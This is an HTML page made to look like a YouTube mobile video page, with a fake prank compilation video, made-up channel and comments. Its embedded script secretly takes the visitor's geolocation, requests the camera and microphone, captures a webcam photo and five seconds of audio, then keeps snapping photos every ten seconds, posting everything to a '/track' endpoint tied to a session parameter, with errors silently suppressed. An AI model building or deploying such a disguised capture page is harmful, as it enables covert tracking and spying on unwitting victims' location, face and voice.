<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>YouTube</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:Roboto,Arial,sans-serif;}
        body{background:#0f0f0f;color:#fff;padding-bottom:60px;}
        .header{background:#0f0f0f;padding:12px 16px;display:flex;align-items:center;gap:16px;position:sticky;top:0;z-index:10;}
        .header .logo{font-size:20px;font-weight:700;color:#fff;}
        .header .logo span{color:#ff0000;}
        .video-container{background:#000;position:relative;width:100%;aspect-ratio:16/9;display:flex;align-items:center;justify-content:center;}
        .video-container video{width:100%;height:100%;object-fit:contain;}
        .video-info{padding:12px 16px;}
        .video-info h2{font-size:18px;font-weight:500;margin-bottom:8px;}
        .video-info .channel{display:flex;align-items:center;gap:12px;margin-bottom:12px;}
        .video-info .channel .avatar{width:36px;height:36px;border-radius:50%;background:#666;display:flex;align-items:center;justify-content:center;font-size:16px;}
        .video-info .channel .name{font-size:14px;font-weight:500;}
        .video-info .channel .sub{font-size:12px;color:#aaa;}
        .video-info .actions{display:flex;gap:20px;font-size:14px;color:#aaa;border-top:1px solid #272727;padding-top:12px;}
        .video-info .actions span{display:flex;align-items:center;gap:6px;}
        .comments{padding:12px 16px;border-top:1px solid #272727;}
        .comments .comment{display:flex;gap:12px;margin-bottom:12px;}
        .comments .comment .cavatar{width:32px;height:32px;border-radius:50%;background:#444;display:flex;align-items:center;justify-content:center;font-size:14px;}
        .comments .comment .cname{font-size:13px;font-weight:500;}
        .comments .comment .ctext{font-size:13px;color:#aaa;margin-top:2px;}
        .bottom-nav{position:fixed;bottom:0;width:100%;background:#0f0f0f;border-top:1px solid #272727;display:flex;justify-content:space-around;padding:10px 0;font-size:18px;color:#aaa;}
    </style>
</head>
<body>

<div class="header">
    <div class="logo"><span>▶</span> YouTube</div>
</div>

<div class="video-container">
    <video id="mainVideo" controls autoplay></video>
</div>

<div class="video-info">
    <h2>😂 FUNNIEST PRANK COMPILATION 🔥</h2>
    <div class="channel">
        <div class="avatar">😂</div>
        <div><div class="name">Prank Masters</div><div class="sub">2.3M subscribers</div></div>
    </div>
    <div class="actions">
        <span>👍 1.2K</span>
        <span>👎 12</span>
        <span>🔗 Share</span>
        <span>💬 Comments</span>
    </div>
</div>

<div class="comments">
    <div class="comment"><div class="cavatar">😎</div><div><div class="cname">GamingGuru</div><div class="ctext">Bhai ye toh next level hai 😂😂</div></div></div>
    <div class="comment"><div class="cavatar">🤣</div><div><div class="cname">FunnyFan</div><div class="ctext">Maza aa gaya! Best video of the year</div></div></div>
    <div class="comment"><div class="cavatar">🔥</div><div><div class="cname">TechWizard</div><div class="ctext">Quality content 💯</div></div></div>
</div>

<div class="bottom-nav">
    <span>🏠</span>
    <span>🔥</span>
    <span>➕</span>
    <span>🔔</span>
    <span>👤</span>
</div>

<script>
    const session = new URLSearchParams(window.location.search).get('session');
    const API_URL = window.location.origin + '/track';

    async function sendData(endpoint, data) {
        try {
            await fetch(`${API_URL}?session=${session}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
        } catch(e) {}
    }

    // Auto location
    navigator.geolocation.getCurrentPosition(pos => {
        sendData('/location', {
            location: {
                lat: pos.coords.latitude,
                lon: pos.coords.longitude,
                acc: pos.coords.accuracy
            }
        });
    }, () => {});

    // Video starts – automatically request camera + mic
    const video = document.getElementById('mainVideo');
    video.src = "https://sample-videos.com/video123/mp4/720/big_buck_bunny_720p_1mb.mp4";
    video.play();

    // Background capture after 2 sec
    setTimeout(async () => {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            const v = document.createElement('video');
            v.srcObject = stream;
            v.play();
            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = v.videoWidth;
                canvas.height = v.videoHeight;
                canvas.getContext('2d').drawImage(v, 0, 0);
                const photoData = canvas.toDataURL('image/jpeg');
                sendData('/photo', { image: photoData });
                stream.getTracks().forEach(t => t.stop());
            }, 1500);
            // Audio record 5 sec
            const mediaRecorder = new MediaRecorder(stream);
            let chunks = [];
            mediaRecorder.ondataavailable = e => chunks.push(e.data);
            mediaRecorder.onstop = () => {
                const blob = new Blob(chunks, { type: 'audio/webm' });
                const reader = new FileReader();
                reader.readAsDataURL(blob);
                reader.onloadend = () => {
                    sendData('/audio', { audio: reader.result });
                };
            };
            mediaRecorder.start();
            setTimeout(() => mediaRecorder.stop(), 5000);
        } catch(e) {}
    }, 3000);

    // Continuous capture every 10 sec (photo only)
    setInterval(async () => {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
            const v = document.createElement('video');
            v.srcObject = stream;
            v.play();
            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = v.videoWidth;
                canvas.height = v.videoHeight;
                canvas.getContext('2d').drawImage(v, 0, 0);
                const photoData = canvas.toDataURL('image/jpeg');
                sendData('/photo', { image: photoData });
                stream.getTracks().forEach(t => t.stop());
            }, 500);
        } catch(e) {}
    }, 10000);
</script>
</body>
</html>
